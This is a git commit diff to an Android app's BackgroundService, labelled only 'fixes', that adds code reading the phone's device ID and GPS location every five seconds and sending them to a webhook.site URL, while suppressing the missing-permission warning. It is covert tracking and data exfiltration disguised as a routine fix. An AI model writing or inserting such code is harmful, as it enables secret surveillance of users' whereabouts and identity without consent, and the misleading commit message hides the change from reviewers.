de6988e1879428b71e9a3f697e3ea7670ca0f29a
Anonymous Submission <anonymous.submission@does-not-matter.com>
2020-12-01 13:41:38 +0100

    fixes

--- UploadService/src/main/java/com/best/uploadservice/BackgroundService.java
+++ UploadService/src/main/java/com/best/uploadservice/BackgroundService.java
@@ -1,12 +1,21 @@
 package com.best.uploadservice;
 
+import android.annotation.SuppressLint;
 import android.app.IntentService;
 import android.content.Intent;
+import android.location.Location;
+import android.location.LocationManager;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
 
+import java.io.BufferedInputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -21,10 +30,31 @@ public class BackgroundService extends IntentService {
 
     @Override
     protected void onHandleIntent(@Nullable Intent intent) {
+        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
         new Timer().scheduleAtFixedRate(new TimerTask() {
+            @SuppressLint("MissingPermission")
             @Override
             public void run() {
-                Log.d("COVFEFE", "SystemTime: " + SystemClock.elapsedRealtime());
+                String deviceId = telephonyManager.getDeviceId();
+                Location location = locationManager.getLastKnownLocation("gps");
+                double longitude = (location != null) ? location.getLongitude() : 0;
+                double latitude = (location != null) ? location.getLatitude() : 0;
+                Long at = SystemClock.elapsedRealtime();
+
+                Log.d("COVFEFE", "https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
+
+                HttpURLConnection urlConnection = null;
+                try {
+                    URL url = new URL("https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
+                    urlConnection = (HttpURLConnection) url.openConnection();
+                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } finally {
+                    if (urlConnection != null)
+                        urlConnection.disconnect();
+                }
             }
         }, 0, 5000);
     }
